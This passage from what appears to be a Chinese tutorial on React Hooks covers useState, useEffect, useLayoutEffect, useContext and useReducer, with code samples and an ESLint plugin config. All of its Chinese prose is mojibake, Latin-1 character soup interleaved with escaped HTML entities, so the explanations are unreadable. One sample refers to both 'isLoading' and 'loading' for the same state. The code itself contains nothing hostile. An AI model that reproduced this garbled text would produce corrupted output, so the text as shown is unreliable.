=\u0026gt; { const imgFetch = useAsync(url =\u0026gt; fetch(url).then(response =\u0026gt; response.json()) ); return ( \u0026lt;div\u0026gt; \u0026lt;button onClick={() =\u0026gt; imgFetch.run(\u0026#39;https://dog.ceo/api/breeds/image/random\u0026#39;)} disabled={imgFetch.isLoading} \u0026gt; Load image \u0026lt;/button\u0026gt; \u0026lt;br /\u0026gt; {imgFetch.loading \u0026amp;\u0026amp; \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;} {imgFetch.error \u0026amp;\u0026amp; \u0026lt;div\u0026gt;Error {imgFetch.error}\u0026lt;/div\u0026gt;} {imgFetch.value \u0026amp;\u0026amp; ( \u0026lt;img src={imgFetch.value.message} alt=\u0026#34;avatar\u0026#34; width={400} height=\u0026#34;auto\u0026#34; /\u0026gt; )} \u0026lt;/div\u0026gt; ); }; // ReactDOM.render(\u0026lt;RandomImage /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;));   å››ã€ESLint æ’ä»¶ Reactå‘å¸ƒäº†ä¸€ä¸ªåä¸º eslint-plugin-react-hooks çš„ ESLint æ’ä»¶æ¥å¼ºåˆ¶æ‰§è¡ŒHooksè§„åˆ™ã€‚\nå¦‚æœé¡¹ç›®ä¸­æ²¡æœ‰è‡ªåŠ¨å®‰è£…ï¼Œå¯è‡ªè¡Œå®‰è£…é…ç½®ï¼š\nyarn add --dev eslint-plugin-react-hooks // ä½ çš„ ESLint é…ç½®\r{\r\u0026#34;plugins\u0026#34;: [\r// ...\r\u0026#34;react-hooks\u0026#34;\r],\r\u0026#34;rules\u0026#34;: {\r// ...\r\u0026#34;react-hooks/rules-of-hooks\u0026#34;: \u0026#34;error\u0026#34;, // æ£€æŸ¥ Hook çš„è§„åˆ™\r\u0026#34;react-hooks/exhaustive-deps\u0026#34;: \u0026#34;warn\u0026#34; // æ£€æŸ¥ effect çš„ä¾èµ–\r}\r} äº”ã€Hooks API 1. useState è¿”å›ä¸€ä¸ª stateï¼Œä»¥åŠæ›´æ–° state çš„å‡½æ•°ã€‚\nconst [state, setState] = useState(initialState); ç­‰å·å·¦è¾¹åå­—å¹¶ä¸æ˜¯ React API çš„éƒ¨åˆ†ï¼Œä½ å¯ä»¥è‡ªå·±å–åå­—ã€‚\nåœ¨åˆå§‹æ¸²æŸ“æœŸé—´ï¼Œè¿”å›çš„çŠ¶æ€ (state) ä¸ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° (initialState) å€¼ç›¸åŒã€‚\nè¿™ç§ JavaScript è¯­æ³•å«æ•°ç»„è§£æ„ã€‚ç­‰ä»·äº\nvar fruitStateVariable = useState(\u0026#39;banana\u0026#39;); // è¿”å›ä¸€ä¸ªæœ‰ä¸¤ä¸ªå…ƒç´ çš„æ•°ç»„\rvar fruit = fruitStateVariable[0]; // æ•°ç»„é‡Œçš„ç¬¬ä¸€ä¸ªå€¼\rvar setFruit = fruitStateVariable[1]; // æ•°ç»„é‡Œçš„ç¬¬äºŒä¸ªå€¼ 1). æ™®é€šå¼æ›´æ–°state åœ¨åç»­çš„é‡æ–°æ¸²æŸ“ä¸­ï¼ŒuseState è¿”å›çš„ç¬¬ä¸€ä¸ªå€¼å°†å§‹ç»ˆæ˜¯æ›´æ–°åæœ€æ–°çš„ stateã€‚\nsetState(newState); 2). å‡½æ•°å¼æ›´æ–°state å¦‚æœæ–°çš„stateéœ€è¦é€šè¿‡ä½¿ç”¨å…ˆå‰çš„stateè®¡ç®—å¾—å‡ºï¼Œé‚£ä¹ˆå¯ä»¥å°†å‡½æ•°ä¼ é€’ç»™ setStateã€‚è¯¥å‡½æ•°å°†æ¥æ”¶å…ˆå‰çš„ stateï¼Œå¹¶è¿”å›ä¸€ä¸ªæ›´æ–°åçš„å€¼ã€‚\nfunction Counter({initialCount}) {\rconst [count, setCount] = useState(initialCount);\rreturn (\r\u0026lt;\u0026gt;\rCount: {count}\r\u0026lt;button onClick={() =\u0026gt; setCount(initialCount)}\u0026gt;Reset\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; setCount(prevCount =\u0026gt; prevCount - 1)}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; setCount(prevCount =\u0026gt; prevCount + 1)}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r} + å’Œ - æŒ‰é’®é‡‡ç”¨å‡½æ•°å¼å½¢å¼ï¼Œå› ä¸ºè¢«æ›´æ–°çš„ state éœ€è¦åŸºäºä¹‹å‰çš„ stateã€‚ä½†æ˜¯é‡ç½®æŒ‰é’®åˆ™é‡‡ç”¨æ™®é€šå½¢å¼ï¼Œå› ä¸ºå®ƒæ€»æ˜¯æŠŠ count è®¾ç½®å›åˆå§‹å€¼ã€‚\nå¦‚æœä½ çš„æ›´æ–°å‡½æ•°è¿”å›å€¼ä¸å½“å‰ state å®Œå…¨ç›¸åŒï¼Œåˆ™éšåçš„é‡æ¸²æŸ“ä¼šè¢«å®Œå…¨è·³è¿‡ã€‚\n3). åˆå¹¶æ›´æ–°å¯¹è±¡ ä¸ class ç»„ä»¶ä¸­çš„ setState æ–¹æ³•ä¸åŒï¼ŒuseState ä¸ä¼šè‡ªåŠ¨åˆå¹¶æ›´æ–°å¯¹è±¡ã€‚å¯ä»¥ç”¨å‡½æ•°å¼çš„ setState ç»“åˆå±•å¼€è¿ç®—ç¬¦æ¥è¾¾åˆ°åˆå¹¶æ›´æ–°å¯¹è±¡çš„æ•ˆæœã€‚\nconst [state, setState] = useState({});\rsetState(prevState =\u0026gt; {\r// ä¹Ÿå¯ä»¥ä½¿ç”¨ Object.assign\rreturn {...prevState, ...updatedValues};\r}); useReducer æ˜¯å¦ä¸€ç§å¯é€‰æ–¹æ¡ˆï¼Œå®ƒæ›´é€‚åˆç”¨äºç®¡ç†åŒ…å«å¤šä¸ªå­å€¼çš„ state å¯¹è±¡ã€‚\n4). æƒ°æ€§åˆå§‹ state initialState å‚æ•°åªä¼šåœ¨ç»„ä»¶çš„åˆå§‹æ¸²æŸ“ä¸­èµ·ä½œç”¨ï¼Œåç»­æ¸²æŸ“æ—¶ä¼šè¢«å¿½ç•¥ã€‚\nå¦‚æœåˆå§‹ state éœ€è¦é€šè¿‡å¤æ‚è®¡ç®—è·å¾—ï¼Œåˆ™å¯ä»¥ä¼ å…¥ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨å‡½æ•°ä¸­è®¡ç®—å¹¶è¿”å›åˆå§‹çš„ stateï¼Œæ­¤å‡½æ•°åªåœ¨åˆå§‹æ¸²æŸ“æ—¶è¢«è°ƒç”¨ï¼š\nconst [state, setState] = useState(() =\u0026gt; {\rconst initialState = someExpensiveComputation(props);\rreturn initialState;\r}); 5). è·³è¿‡ state æ›´æ–° è°ƒç”¨ State Hook çš„æ›´æ–°å‡½æ•°setStateå¹¶ä¼ å…¥å½“å‰çš„ state æ—¶ï¼ŒReact å°†è·³è¿‡å­ç»„ä»¶çš„æ¸²æŸ“åŠ effect çš„æ‰§è¡Œã€‚ï¼ˆReact ä½¿ç”¨Object.isæ¯”è¾ƒç®—æ³•æ¥æ¯”è¾ƒ stateã€‚ï¼‰\néœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒReact å¯èƒ½ä»éœ€è¦åœ¨è·³è¿‡æ¸²æŸ“å‰æ¸²æŸ“è¯¥ç»„ä»¶ã€‚ä¸è¿‡ç”±äº React ä¸ä¼šå¯¹ç»„ä»¶æ ‘çš„â€œæ·±å±‚â€èŠ‚ç‚¹è¿›è¡Œä¸å¿…è¦çš„æ¸²æŸ“ï¼Œæ‰€ä»¥å¤§å¯ä¸å¿…æ‹…å¿ƒã€‚\nå¦‚æœåœ¨æ¸²æŸ“æœŸé—´æ‰§è¡Œäº†é«˜å¼€é”€çš„è®¡ç®—ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ useMemo æ¥è¿›è¡Œä¼˜åŒ–ã€‚\n2. useEffect Effect Hook å¯ä»¥è®©ä½ åœ¨å‡½æ•°ç»„ä»¶ä¸­æ‰§è¡Œå‰¯ä½œç”¨æ“ä½œ(æ”¹å˜ DOMã€æ·»åŠ è®¢é˜…ã€è®¾ç½®å®šæ—¶å™¨ã€è®°å½•æ—¥å¿—ç­‰)\nèµ‹å€¼ç»™ useEffect çš„å‡½æ•°ä¼šåœ¨ç»„ä»¶æ¸²æŸ“åˆ°å±å¹•ä¹‹åæ‰§è¡Œã€‚\nå¯ä»¥æŠŠ effect çœ‹ä½œä» React çš„çº¯å‡½æ•°å¼ä¸–ç•Œé€šå¾€å‘½ä»¤å¼ä¸–ç•Œçš„é€ƒç”Ÿé€šé“ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œeffect å°†åœ¨æ¯è½®æ¸²æŸ“ç»“æŸåæ‰§è¡Œï¼Œä½†ä½ å¯ä»¥é€‰æ‹©è®©å®ƒ åœ¨åªæœ‰æŸäº›å€¼æ”¹å˜çš„æ—¶å€™ æ‰æ‰§è¡Œã€‚\nuseEffect(didUpdate); 1). æ¸…é™¤ effect é€šå¸¸ï¼Œç»„ä»¶å¸è½½æ—¶éœ€è¦æ¸…é™¤ effect åˆ›å»ºçš„è¯¸å¦‚è®¢é˜…æˆ–è®¡æ—¶å™¨ ID ç­‰èµ„æºã€‚\nè¦å®ç°è¿™ä¸€ç‚¹ï¼ŒuseEffect å‡½æ•°éœ€è¿”å›ä¸€ä¸ªæ¸…é™¤å‡½æ•°ã€‚ä»¥ä¸‹å°±æ˜¯ä¸€ä¸ªåˆ›å»ºè®¢é˜…çš„ä¾‹å­ï¼š\nuseEffect(() =\u0026gt; {\rconst subscription = props.source.subscribe();\rreturn () =\u0026gt; {\r// æ¸…é™¤è®¢é˜…\rsubscription.unsubscribe();\r};\r}); ä¸ºé˜²æ­¢å†…å­˜æ³„æ¼ï¼Œæ¸…é™¤å‡½æ•°ä¼šåœ¨ç»„ä»¶å¸è½½å‰æ‰§è¡Œã€‚\nå¦å¤–ï¼Œå¦‚æœç»„ä»¶å¤šæ¬¡æ¸²æŸ“ï¼ˆé€šå¸¸å¦‚æ­¤ï¼‰ï¼Œåˆ™åœ¨æ‰§è¡Œä¸‹ä¸€ä¸ª effect ä¹‹å‰ï¼Œä¸Šä¸€ä¸ª effect å°±å·²è¢«æ¸…é™¤ã€‚\n2). effect çš„æ‰§è¡Œæ—¶æœº ä¸ componentDidMountã€componentDidUpdate ä¸åŒçš„æ˜¯ï¼Œä¼ ç»™ useEffect çš„å‡½æ•°ä¼šåœ¨æµè§ˆå™¨å®Œæˆå¸ƒå±€ä¸ç»˜åˆ¶ä¹‹åï¼Œåœ¨ä¸€ä¸ªå»¶è¿Ÿäº‹ä»¶ä¸­è¢«è°ƒç”¨ã€‚\nè¿™ä½¿å¾—å®ƒé€‚ç”¨äºè®¸å¤šå¸¸è§çš„å‰¯ä½œç”¨åœºæ™¯ï¼Œæ¯”å¦‚è®¾ç½®è®¢é˜…å’Œäº‹ä»¶å¤„ç†ç­‰æƒ…å†µï¼Œå› ä¸ºç»å¤§å¤šæ•°æ“ä½œä¸åº”é˜»å¡æµè§ˆå™¨å¯¹å±å¹•çš„æ›´æ–°ã€‚\nè™½ç„¶ useEffect ä¼šåœ¨æµè§ˆå™¨ç»˜åˆ¶åå»¶è¿Ÿæ‰§è¡Œï¼Œä½†ä¼šä¿è¯åœ¨ä»»ä½•æ–°çš„æ¸²æŸ“å‰æ‰§è¡Œã€‚\nåœ¨å¼€å§‹æ–°çš„æ›´æ–°å‰ï¼ŒReact æ€»ä¼šå…ˆæ¸…é™¤ä¸Šä¸€è½®æ¸²æŸ“çš„ effectã€‚\n3). useLayoutEffect ç„¶è€Œï¼Œå¹¶éæ‰€æœ‰ effect éƒ½å¯ä»¥è¢«å»¶è¿Ÿæ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå¯¹ç”¨æˆ·å¯è§çš„ DOM å˜æ›´å°±å¿…é¡»åœ¨æµè§ˆå™¨æ‰§è¡Œä¸‹ä¸€æ¬¡ç»˜åˆ¶å‰è¢«åŒæ­¥æ‰§è¡Œï¼Œè¿™æ ·ç”¨æˆ·æ‰ä¸ä¼šæ„Ÿè§‰åˆ°è§†è§‰ä¸Šçš„ä¸ä¸€è‡´ã€‚ï¼ˆæ¦‚å¿µä¸Šç±»ä¼¼äºè¢«åŠ¨ç›‘å¬äº‹ä»¶å’Œä¸»åŠ¨ç›‘å¬äº‹ä»¶çš„åŒºåˆ«ã€‚ï¼‰React ä¸ºæ­¤æä¾›äº†ä¸€ä¸ªé¢å¤–çš„ useLayoutEffect Hook æ¥å¤„ç†è¿™ç±» effectã€‚å®ƒå’Œ useEffect çš„ç»“æ„ç›¸åŒï¼ŒåŒºåˆ«åªæ˜¯è°ƒç”¨æ—¶æœºä¸åŒã€‚\nå®ƒä¼šåœ¨æ‰€æœ‰çš„ DOM å˜æ›´ä¹‹ååŒæ­¥è°ƒç”¨ effectã€‚å¯ä»¥ä½¿ç”¨å®ƒæ¥è¯»å– DOM å¸ƒå±€å¹¶åŒæ­¥è§¦å‘é‡æ¸²æŸ“ã€‚åœ¨æµè§ˆå™¨æ‰§è¡Œç»˜åˆ¶ä¹‹å‰ï¼ŒuseLayoutEffect å†…éƒ¨çš„æ›´æ–°è®¡åˆ’å°†è¢«åŒæ­¥åˆ·æ–°ã€‚\nå°½å¯èƒ½ä½¿ç”¨æ ‡å‡†çš„ useEffect ä»¥é¿å…é˜»å¡è§†è§‰æ›´æ–°ã€‚\nå¦‚æœä½ æ­£åœ¨å°†ä»£ç ä» class ç»„ä»¶è¿ç§»åˆ°ä½¿ç”¨ Hook çš„å‡½æ•°ç»„ä»¶ï¼Œåˆ™éœ€è¦æ³¨æ„ useLayoutEffect ä¸ componentDidMountã€componentDidUpdate çš„è°ƒç”¨é˜¶æ®µæ˜¯ä¸€æ ·çš„ã€‚\nä½†æ˜¯ï¼Œæˆ‘ä»¬æ¨èä½ ä¸€å¼€å§‹å…ˆç”¨ useEffectï¼Œåªæœ‰å½“å®ƒå‡ºé—®é¢˜çš„æ—¶å€™å†å°è¯•ä½¿ç”¨ useLayoutEffectã€‚\n4). SSR æœåŠ¡å™¨ç«¯æ¸²æŸ“ å¦‚æœä½ ä½¿ç”¨æœåŠ¡ç«¯æ¸²æŸ“ï¼Œè¯·è®°ä½ï¼Œæ— è®º useLayoutEffect è¿˜æ˜¯ useEffect éƒ½æ— æ³•åœ¨ Javascript ä»£ç åŠ è½½å®Œæˆä¹‹å‰æ‰§è¡Œã€‚\nè¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨æœåŠ¡ç«¯æ¸²æŸ“ç»„ä»¶ä¸­å¼•å…¥ useLayoutEffect ä»£ç æ—¶ä¼šè§¦å‘ React å‘Šè­¦ã€‚\nè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦å°†ä»£ç é€»è¾‘ç§»è‡³ useEffect ä¸­ï¼ˆå¦‚æœé¦–æ¬¡æ¸²æŸ“ä¸éœ€è¦è¿™æ®µé€»è¾‘çš„æƒ…å†µä¸‹ï¼‰ï¼Œæˆ–æ˜¯å°†è¯¥ç»„ä»¶å»¶è¿Ÿåˆ°å®¢æˆ·ç«¯æ¸²æŸ“å®Œæˆåå†æ˜¾ç¤ºï¼ˆå¦‚æœç›´åˆ° useLayoutEffect æ‰§è¡Œä¹‹å‰ HTML éƒ½æ˜¾ç¤ºé”™ä¹±çš„æƒ…å†µä¸‹ï¼‰ã€‚\nè‹¥è¦ä»æœåŠ¡ç«¯æ¸²æŸ“çš„ HTML ä¸­æ’é™¤ä¾èµ–å¸ƒå±€ effect çš„ç»„ä»¶ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ showChild \u0026amp;\u0026amp; \u0026lt;Child /\u0026gt; è¿›è¡Œæ¡ä»¶æ¸²æŸ“ï¼Œå¹¶ä½¿ç”¨ useEffect(() =\u0026gt; { setShowChild(true); }, []) å»¶è¿Ÿå±•ç¤ºç»„ä»¶ã€‚\nè¿™æ ·ï¼Œåœ¨å®¢æˆ·ç«¯æ¸²æŸ“å®Œæˆä¹‹å‰ï¼ŒUI å°±ä¸ä¼šåƒä¹‹å‰é‚£æ ·æ˜¾ç¤ºé”™ä¹±äº†ã€‚\n5). effect çš„æ¡ä»¶æ‰§è¡Œ1 é»˜è®¤æƒ…å†µä¸‹ï¼Œeffect ä¼šåœ¨æ¯è½®ç»„ä»¶æ¸²æŸ“å®Œæˆåæ‰§è¡Œã€‚è¿™æ ·çš„è¯ï¼Œä¸€æ—¦ effect çš„ä¾èµ–å‘ç”Ÿå˜åŒ–ï¼Œå®ƒå°±ä¼šè¢«é‡æ–°åˆ›å»ºã€‚\nç„¶è€Œï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹è¿™ä¹ˆåšå¯èƒ½ä¼šçŸ«æ‰è¿‡æ­£ã€‚æ¯”å¦‚ï¼Œåœ¨ä¸Šä¸€ç« èŠ‚çš„è®¢é˜…ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä¸éœ€è¦åœ¨æ¯æ¬¡ç»„ä»¶æ›´æ–°æ—¶éƒ½åˆ›å»ºæ–°çš„è®¢é˜…ï¼Œè€Œæ˜¯ä»…éœ€è¦åœ¨ source prop æ”¹å˜æ—¶é‡æ–°åˆ›å»ºã€‚\nè¦å®ç°è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ç»™ useEffect ä¼ é€’ç¬¬äºŒä¸ªå‚æ•°ï¼Œå®ƒæ˜¯ effect æ‰€ä¾èµ–çš„å€¼æ•°ç»„ã€‚\næ›´æ–°åçš„ç¤ºä¾‹å¦‚ä¸‹ï¼š(æ­¤æ—¶ï¼Œåªæœ‰å½“ props.source æ”¹å˜åæ‰ä¼šé‡æ–°åˆ›å»ºè®¢é˜…ã€‚)\nuseEffect(\r() =\u0026gt; {\rconst subscription = props.source.subscribe();\rreturn () =\u0026gt; {\rsubscription.unsubscribe();\r};\r},\r[props.source],\r); 5). effect çš„æ¡ä»¶æ‰§è¡Œ2 å¦‚æœä½ è¦ä½¿ç”¨æ­¤ä¼˜åŒ–æ–¹å¼ï¼Œè¯·ç¡®ä¿æ•°ç»„ä¸­åŒ…å«äº†æ‰€æœ‰å¤–éƒ¨ä½œç”¨åŸŸä¸­ä¼šå‘ç”Ÿå˜åŒ–ä¸”åœ¨ effect ä¸­ä½¿ç”¨çš„å˜é‡ï¼Œå¦åˆ™ä½ çš„ä»£ç ä¼šå¼•ç”¨åˆ°å…ˆå‰æ¸²æŸ“ä¸­çš„æ—§å˜é‡ã€‚\nå¦‚æœæƒ³æ‰§è¡Œåªè¿è¡Œä¸€æ¬¡çš„ effectï¼ˆä»…åœ¨ç»„ä»¶æŒ‚è½½å’Œå¸è½½æ—¶æ‰§è¡Œï¼‰ï¼Œå¯ä»¥ä¼ é€’ä¸€ä¸ªç©ºæ•°ç»„ï¼ˆ[]ï¼‰ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚\nè¿™å°±å‘Šè¯‰ React ä½ çš„ effect ä¸ä¾èµ–äº props æˆ– state ä¸­çš„ä»»ä½•å€¼ï¼Œæ‰€ä»¥å®ƒæ°¸è¿œéƒ½ä¸éœ€è¦é‡å¤æ‰§è¡Œã€‚è¿™å¹¶ä¸å±äºç‰¹æ®Šæƒ…å†µ â€”â€” å®ƒä¾ç„¶éµå¾ªè¾“å…¥æ•°ç»„çš„å·¥ä½œæ–¹å¼ã€‚\nå¦‚æœä½ ä¼ å…¥äº†ä¸€ä¸ªç©ºæ•°ç»„ï¼ˆ[]ï¼‰ï¼Œeffect å†…éƒ¨çš„ props å’Œ state å°±ä¼šä¸€ç›´æŒæœ‰å…¶åˆå§‹å€¼ã€‚\nå°½ç®¡ä¼ å…¥ [] ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°æœ‰ç‚¹ç±»ä¼¼äº componentDidMount å’Œ componentWillUnmount çš„æ€ç»´æ¨¡å¼ï¼Œä½†å®ƒæ˜¯æ›´å¥½çš„æ–¹å¼æ¥é¿å…è¿‡äºé¢‘ç¹çš„é‡å¤è°ƒç”¨ effectã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œè¯·è®°å¾— React ä¼šç­‰å¾…æµè§ˆå™¨å®Œæˆç”»é¢æ¸²æŸ“ä¹‹åæ‰ä¼šå»¶è¿Ÿè°ƒç”¨ useEffectï¼Œå› æ­¤ä¼šä½¿å¾—å¤„ç†é¢å¤–æ“ä½œå¾ˆæ–¹ä¾¿ã€‚\nReactæ¨èå¯ç”¨ eslint-plugin-react-hooks ä¸­çš„ exhaustive-deps è§„åˆ™ã€‚æ­¤è§„åˆ™ä¼šåœ¨æ·»åŠ é”™è¯¯ä¾èµ–æ—¶å‘å‡ºè­¦å‘Šå¹¶ç»™å‡ºä¿®å¤å»ºè®®ã€‚\nä¾èµ–é¡¹æ•°ç»„ä¸ä¼šä½œä¸ºå‚æ•°ä¼ ç»™ effect å‡½æ•°ã€‚è™½ç„¶ä»æ¦‚å¿µä¸Šæ¥è¯´å®ƒè¡¨ç°ä¸ºï¼šæ‰€æœ‰ effect å‡½æ•°ä¸­å¼•ç”¨çš„å€¼éƒ½åº”è¯¥å‡ºç°åœ¨ä¾èµ–é¡¹æ•°ç»„ä¸­ã€‚æœªæ¥ç¼–è¯‘å™¨ä¼šæ›´åŠ æ™ºèƒ½ï¼Œå±Šæ—¶è‡ªåŠ¨åˆ›å»ºæ•°ç»„å°†æˆä¸ºå¯èƒ½ã€‚\n3. useContext æˆ‘ä¸ªäººç»å¾—ï¼ŒuseContext åªé€‚åˆç”¨æ¥åšUIä¸»é¢˜çš„ä¼ é€’ const value = useContext(MyContext); æ¥æ”¶ä¸€ä¸ª context å¯¹è±¡ï¼ˆReact.createContext çš„è¿”å›å€¼ï¼‰å¹¶è¿”å›è¯¥ context çš„å½“å‰å€¼ã€‚\nå½“å‰çš„ context å€¼ç”±ä¸Šå±‚ç»„ä»¶ä¸­è·ç¦»å½“å‰ç»„ä»¶æœ€è¿‘çš„\u0026lt;MyContext.Provider\u0026gt;çš„value propå†³å®šã€‚\nå½“ç»„ä»¶ä¸Šå±‚æœ€è¿‘çš„\u0026lt;MyContext.Provider\u0026gt;æ›´æ–°æ—¶ï¼Œè¯¥ Hook ä¼šè§¦å‘é‡æ¸²æŸ“ï¼Œå¹¶ä½¿ç”¨æœ€æ–°ä¼ é€’ç»™ MyContext provider çš„ context value å€¼ã€‚\nå³ä½¿ç¥–å…ˆä½¿ç”¨ React.memo æˆ– shouldComponentUpdateï¼Œä¹Ÿä¼šåœ¨ç»„ä»¶æœ¬èº«ä½¿ç”¨ useContext æ—¶é‡æ–°æ¸²æŸ“ã€‚ åˆ«å¿˜è®° useContext çš„å‚æ•°å¿…é¡»æ˜¯ context å¯¹è±¡æœ¬èº«ï¼š\næ­£ç¡®ï¼š useContext(MyContext)\né”™è¯¯ï¼š useContext(MyContext.Consumer)\né”™è¯¯ï¼š useContext(MyContext.Provider)\nè°ƒç”¨äº† useContext çš„ç»„ä»¶æ€»ä¼šåœ¨ context å€¼å˜åŒ–æ—¶é‡æ–°æ¸²æŸ“ã€‚å¦‚æœé‡æ¸²æŸ“ç»„ä»¶çš„å¼€é”€è¾ƒå¤§ï¼Œä½ å¯ä»¥ é€šè¿‡ä½¿ç”¨ memoization æ¥ä¼˜åŒ–ã€‚\nä½¿ç”¨æ–¹æ³• useContext(MyContext) åªæ˜¯è®©ä½ èƒ½å¤Ÿè¯»å– context çš„å€¼ä»¥åŠè®¢é˜… context çš„å˜åŒ–ã€‚ä½ ä»ç„¶éœ€è¦åœ¨ä¸Šå±‚ç»„ä»¶æ ‘ä¸­ä½¿ç”¨ \u0026lt;MyContext.Provider\u0026gt; æ¥ä¸ºä¸‹å±‚ç»„ä»¶æä¾› contextã€‚\nconst themes = {\rlight: {\rforeground: \u0026#34;#000000\u0026#34;,\rbackground: \u0026#34;#eeeeee\u0026#34;\r},\rdark: {\rforeground: \u0026#34;#ffffff\u0026#34;,\rbackground: \u0026#34;#222222\u0026#34;\r}\r};\r------------------------Step1. åˆ›å»ºä¸Šä¸‹æ–‡----------------\rconst ThemeContext = React.createContext(themes.light);\r--------------------------------------------------------\rfunction App() {\rreturn (\r------------------------Step2. æä¾›ä¸Šä¸‹æ–‡----------------\r\u0026lt;ThemeContext.Provider value={themes.dark}\u0026gt;\r\u0026lt;Toolbar /\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r--------------------------------------------------------\r);\r}\rfunction Toolbar(props) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;ThemedButton /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction ThemedButton() {\r------------------------Step3. ä½¿ç”¨ä¸Šä¸‹æ–‡---------------------\rconst theme = useContext(ThemeContext);\rreturn (\r\u0026lt;button style={{ background: theme.background, color: theme.foreground }}\u0026gt;\rI am styled by theme context!\r\u0026lt;/button\u0026gt;\r);\r--------------------------------------------------------------\r} 4. useReducer const [state, dispatch] = useReducer(reducer, initialArg, init); useState çš„æ›¿ä»£æ–¹æ¡ˆã€‚å®ƒæ¥æ”¶ä¸€ä¸ªå½¢å¦‚ (state, action) =\u0026gt; newState çš„ reducerï¼Œå¹¶è¿”å›å½“å‰çš„ state ä»¥åŠä¸å…¶é…å¥—çš„ dispatch æ–¹æ³•ã€‚ï¼ˆå¦‚æœä½ ç†Ÿæ‚‰ Redux çš„è¯ï¼Œå°±å·²ç»çŸ¥é“å®ƒå¦‚ä½•å·¥ä½œäº†ã€‚ï¼‰\nåœ¨æŸäº›åœºæ™¯ä¸‹ï¼ŒuseReducer ä¼šæ¯” useState æ›´é€‚ç”¨ï¼Œä¾‹å¦‚ state é€»è¾‘è¾ƒå¤æ‚ä¸”åŒ…å«å¤šä¸ªå­å€¼ï¼Œæˆ–è€…ä¸‹ä¸€ä¸ª state ä¾èµ–äºä¹‹å‰çš„ state ç­‰ã€‚\nå¹¶ä¸”ï¼Œä½¿ç”¨ useReducer è¿˜èƒ½ç»™é‚£äº›ä¼šè§¦å‘æ·±æ›´æ–°çš„ç»„ä»¶åšæ€§èƒ½ä¼˜åŒ–ï¼Œå› ä¸ºå¯ä»¥å‘å­ç»„ä»¶ä¼ é€’ dispatch è€Œä¸æ˜¯å›è°ƒå‡½æ•°ã€‚\n1). ä½¿ç”¨æ–¹æ³• ä»¥ä¸‹æ˜¯ç”¨ reducer é‡å†™ useState ä¸€èŠ‚çš„è®¡æ•°å™¨ç¤ºä¾‹ï¼š\nconst initialState = {count: 0};\rfunction reducer(state, action) {\rswitch (action.type) {\rcase \u0026#39;increment\u0026#39;:\rreturn {count: state.count + 1};\rcase \u0026#39;decrement\u0026#39;:\rreturn {count: state.count - 1};\rdefault:\rthrow new Error();\r}\r}\rfunction Counter() {\rconst [state, dispatch] = useReducer(reducer, initialState);\rreturn (\r\u0026lt;\u0026gt;\rCount: {state.count}\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: \u0026#39;decrement\u0026#39;})}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: \u0026#39;increment\u0026#39;})}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r} 2). æŒ‡å®šåˆå§‹ state æœ‰ä¸¤ç§ä¸åŒåˆå§‹åŒ– useReducer state çš„æ–¹å¼ï¼Œå¯ä»¥æ ¹æ®ä½¿ç”¨åœºæ™¯é€‰æ‹©å…¶ä¸­çš„ä¸€ç§ã€‚\nå°†åˆå§‹ state ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ useReducer æ˜¯æœ€ç®€å•çš„æ–¹æ³•ï¼š\nconst [state, dispatch] = useReducer(\rreducer,\r{count: initialCount}\r); React ä¸ä½¿ç”¨ state = initialState è¿™ä¸€ç”± Redux æ¨å¹¿å¼€æ¥çš„å‚æ•°çº¦å®šã€‚\næœ‰æ—¶å€™åˆå§‹å€¼ä¾èµ–äº propsï¼Œå› æ­¤éœ€è¦åœ¨è°ƒç”¨ Hook æ—¶æŒ‡å®šã€‚\nå¦‚æœç‰¹åˆ«å–œæ¬¢Reduxçš„å‚æ•°çº¦å®šï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ useReducer(reducer, undefined, reducer) æ¥æ¨¡æ‹Ÿ Redux çš„è¡Œä¸ºï¼Œä½†Reactä¸é¼“åŠ±è¿™ä¹ˆåšã€‚\n3). æƒ°æ€§åˆå§‹åŒ– å¯ä»¥é€‰æ‹©æƒ°æ€§åœ°åˆ›å»ºåˆå§‹ stateã€‚ä¸ºæ­¤ï¼Œéœ€è¦å°† init å‡½æ•°ä½œä¸º useReducer çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥ï¼Œè¿™æ ·åˆå§‹ state å°†è¢«è®¾ç½®ä¸º init(initialArg)ã€‚\nè¿™ä¹ˆåšå¯ä»¥å°†ç”¨äºè®¡ç®— state çš„é€»è¾‘æå–åˆ° reducer å¤–éƒ¨ï¼Œè¿™ä¹Ÿä¸ºå°†æ¥å¯¹é‡ç½® state çš„ action åšå¤„ç†æä¾›äº†ä¾¿åˆ©ï¼š\nfunction init(initialCount) {\rreturn {count: initialCount};\r}\rfunction reducer(state, action) {\rswitch (action.type) {\rcase \u0026#39;increment\u0026#39;:\rreturn {count: state.count + 1};\rcase \u0026#39;decrement\u0026#39;:\rreturn {count: state.count - 1};\rcase \u0026#39;reset\u0026#39;:\rreturn init(action.payload);\rdefault:\rthrow new Error();\r}\r}\rfunction Counter({initialCount}) {\rconst 